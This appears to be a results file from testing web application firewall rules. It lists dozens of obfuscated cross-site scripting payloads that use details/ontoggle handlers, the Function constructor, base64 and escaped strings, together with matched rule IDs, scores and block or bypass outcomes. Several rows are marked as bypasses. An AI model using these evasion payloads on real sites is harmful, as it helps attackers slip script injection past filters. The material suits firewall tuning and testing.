680,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603371669.519229
681,"<details open ontoggle=""top['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,177603371732.188436
682,"<details open ontoggle=""self['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,29v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,69t:urlDecodeUni,t:compressWhitespace || ",20,177603371867.982492
683,"<details open ontoggle=""parent['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603371985.581217
685,"<details open ontoggle=""globalThis['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603372137.935619
686,"<details open ontoggle=""window['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,71t:urlDecodeUni,t:compressWhitespace || ",20,177603372219.966353
687,"<details open ontoggle=""Function(String.fromCharCode(97,108,101,114,116,40,49,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o33,19v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760337237.147846
688,"<details open ontoggle=""Function(`ale`+`rt(1)`)()""></details>",0,1,block,4,"941100,941120,942100,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,61 || ",15,177603372483.423958
692,"<details open ontoggle=""[].constructor.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760337292.586130
693,"<details open ontoggle=""Function('al'+'e'+'rt'+'(1)')()""></details>",0,1,block,5,"941100,941120,942100,942100,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,67 || v217,67t:urlDecodeUni || ",20,177603373069.296298
694,"<details open ontoggle=""(function(){return this})()['Function']('ale'+'rt(1)')()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,56v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603373187.419650
696,"<details open ontoggle=""Function.prototype.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603373337.035492
697,"<details open ontoggle=""Function.call(null,'ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603373462.970448
698,"<details open ontoggle=""Function.apply(null,['ale'+'rt(1)'])()""></details>",0,1,bypass,2,"941100,941120","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603373415.853895
703,"<details open ontoggle=""Function('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941120,942100,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,76 || ",15,177603374061.854352
719,"<details open ontoggle=""Function('retu'+'rn\x20ev'+'al')()(atob('YWxlcnQoMSk='))"">",0,1,block,5,"941100,941120,942100,942100,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,82 || v217,82t:urlDecodeUni || ",20,17760337555.088807
720,"<details open ontoggle=""Function(['retu','rn ev','al'].join(''))()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"933210,941100,941120,949110","o59,29v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603375678.968575
721,"<details open ontoggle=""Function(String.fromCharCode(114,101,116,117,114,110,32,101,118,97,108))()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"934100,941100,941120,949110","o33,19v217,122 || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603375786.392105
723,"<details open ontoggle=""Function('return\u0020eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941120,942100,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,78 || ",15,177603375992.828805
724,"<details open ontoggle=""Function('return\x09eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941120,942100,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,76 || ",15,177603376019.105106
726,"<details open ontoggle=""(function(){return Function})()('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,73v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603376215.384697
729,"<details open ontoggle=""Function('ret'+'urn\x20'+'eval')()(atob('YWxl'+'cnQoMSk='))"">",0,1,block,5,"941100,941120,942100,942100,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,85 || v217,85t:urlDecodeUni || ",20,177603376511.779498
730,"<details open ontoggle=""Function(atob('cmV0dXJuIGV2YWw='))()(atob('YWxlcnQoMSk='))"">",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603376632.955338
732,"<details open ontoggle=""self['Function']('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,54v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,84t:urlDecodeUni,t:compressWhitespace || ",20,177603376860.895774
734,"<details open ontoggle=""Function(unescape('return%20eval'))()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"933210,941100,941120,949110","o32,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760337707.372328
735,"<details open ontoggle=""Function('return\x20'+'eval')()(atob('YWxl'+'cnQoMS'+'k='))"">",0,1,block,5,"941100,941120,942100,942100,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,85 || v217,85t:urlDecodeUni || ",20,177603377197.528515
736,"<details open ontoggle=""Function('return\x20eval'.replace(/\s/,' '))()(atob('YWxlcnQoMSk='))"">",0,1,bypass,2,"941100,941120","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603377297.626383
739,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603377578.671059
740,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603377657.270330
742,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603377873.325848
744,"<details open ontoggle=""new Function('\141\154\145\162\164\05041\051')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603378020.973270
746,"<details open ontoggle=""Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"941100,941120,942100,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,82 || ",15,177603378292.839384
747,"<details open ontoggle=""new window['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o34,50v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,96t:urlDecodeUni,t:compressWhitespace || ",20,177603378310.071979
748,"<details open ontoggle=""new/**/ Function /**/ ('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603378414.411992
749,"<details	open	ontoggle=""new	Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603378541.561351
750,"<details open ontoggle=""new Function(`&#97;&#108;&#101;&#114;&#116;(1)`)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603378653.362869
751,"<details open ontoggle=""new Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o36,55v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603378739.769842
753,"<details open ontoggle=""new top.Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603378953.712102
754,"<details open ontoggle=""new Function('aler'+'t(1)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603379030.200344
756,"<details open ontoggle=""new self['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o32,50v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,94t:urlDecodeUni,t:compressWhitespace || ",20,177603379246.912235
758,"<details open ontoggle=""new parent.Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603379461.524114
759,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,50,57,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379546.277508
760,"<details open ontoggle=""new Function(atob('YWxlcnQoMjkp'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379640.191169
762,"<details open ontoggle=""new Function(['\u0061','\u006c','\u0065','\u0072','\u0074','\u0028','\u0032','\u0039','\u0029'].join(''))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,143 || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379834.095879
763,"<details open ontoggle=""new Function('\141\154\145\162\164\05029\051')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379985.548284
767,"<details open ontoggle=""new Function(`\u0061\u006c\u0065\u0072\u0074(29)`)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603380399.874624
768,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074\u002829\u0029')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760338045.429917
771,"<details open ontoggle=""new Function('\u0061'+'\u006c'+'\u0065'+'\u0072'+'\u0074(29)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,100 || o24,13v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603380765.551319
772,"<details open ontoggle=""new Function('&#97;&#108;&#101;&#114;&#116;(29)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603380928.880512
773,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074\050\06229\051')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603381062.178063
774,"<details open ontoggle=""new Function.constructor('\u0061\u006c\u0065\u0072\u0074(29)')()""></details>",0,1,bypass,2,"941100,941120","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603381158.296750
775,"<details open ontoggle=""new Function['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072']('\u0061\u006c\u0065\u0072\u0074(29)')()""></details>",0,1,bypass,2,"941100,941120","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603381232.826244
779,"<details open ontoggle=""Function('al'+'ert(1)')()"">",0,1,block,5,"941100,941120,942100,942100,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,51 || v216,51t:urlDecodeUni || ",20,177603381611.130938
780,"<details open ontoggle=""new window['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,65t:urlDecodeUni,t:compressWhitespace || ",20,177603381729.883825
781,"<details open ontoggle=""new(Function)('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o27,27v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603381865.957566
782,"<details open ontoggle=""new/**/Function('al'+'ert(1)')()"">",0,1,bypass,2,"941100,941120","v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760338196.438419
783,"<details open ontoggle=""new Function('al\x65rt(1)')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382080.871060
784,"<details open ontoggle=""new Function('al\u0065rt(1)')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382189.950697
785,"<details open ontoggle=""new Function('\x61l'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,58 || o24,13v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603382226.745530
786,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,62 || v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382457.906064
787,"<details open ontoggle=""new Function('al'.concat('ert(1)'))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382547.284878
788,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382687.720503
791,"<details open ontoggle=""new globalThis['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o38,29v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603382958.528040
792,"<details open ontoggle=""new top['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o31,29v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,15v217,62t:urlDecodeUni,t:compressWhitespace || ",20,177603383029.518024
793,"<details open ontoggle=""new self['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o32,29v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,63t:urlDecodeUni,t:compressWhitespace || ",20,177603383118.310944
